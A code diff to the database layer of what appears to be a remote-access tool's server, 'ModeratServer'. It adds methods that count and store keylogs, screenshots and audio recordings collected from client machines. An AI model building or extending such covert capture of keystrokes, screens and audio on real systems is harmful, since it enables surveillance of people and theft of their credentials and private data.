@@ -1,5 +1,5 @@
 import hashlib
-import datetime
+from datetime import datetime
 from ModeratServer.models import *
 
 
@@ -28,6 +28,9 @@ class MDB:
         moderators = Moderators.objects.filter(privileges=1)
         all_moderators_id = moderators.values_list('pk', flat=True).distinct()
         return Clients.objects.all().exclude(pk__in=all_moderators_id)
+
+    def getClient(self, identifier):
+        return Clients.objects.get(identifier=identifier)
 
     def getClients(self, moderator):
         clients = Clients.objects.filter(pk=moderator.pk)
@@ -168,11 +171,47 @@ class MDB:
     def getModerators(self):
         return Moderators.objects.all()
 
-    def screenshotsCount(self, identifier, date):
+    def logsCount(self, identifier, date):
+        client = self.getClient(identifier)
+        year, month, day = date.split('-')
+        screenshots = Screenshots.objects.filter(client_id=client,
+                                                 date__year=year,
+                                                 date__month=month,
+                                                 date__day=day)
+        keylogs = Keylogs.objects.filter(client_id=client,
+                                                 date__year=year,
+                                                 date__month=month,
+                                                 date__day=day)
+        audios = Audios.objects.filter(client_id=client,
+                                         date__year=year,
+                                         date__month=month,
+                                         date__day=day)
+        return {
+            'screenshots': {
+                'new': screenshots.filter(viewed=False).count(),
+                'old': screenshots.filter(viewed=True).count()
+            },
+            'keylogs': {
+                'new': keylogs.filter(viewed=False).count(),
+                'old': keylogs.filter(viewed=True).count()
+            },
+            'audio': {
+                'new': audios.filter(viewed=False).count(),
+                'old': audios.filter(viewed=True).count()
+            }
+        }
+
+    def getScreenshots(self, identifier, path, viewed):
         pass
 
-    def audiosCount(self, identifier, date):
+    def addScreenshot(self, identifier, title_name, path):
+        new_screenshot = Screenshots(client_id=self.getClient(identifier),
+                                     title_name=title_name,
+                                     path=path)
+        new_screenshot.save()
+
+    def addKeylog(self, identifier, date):
         pass
 
-    def keylogsCount(self, identifier, date):
+    def addAudio(self, identifier, date):
         pass
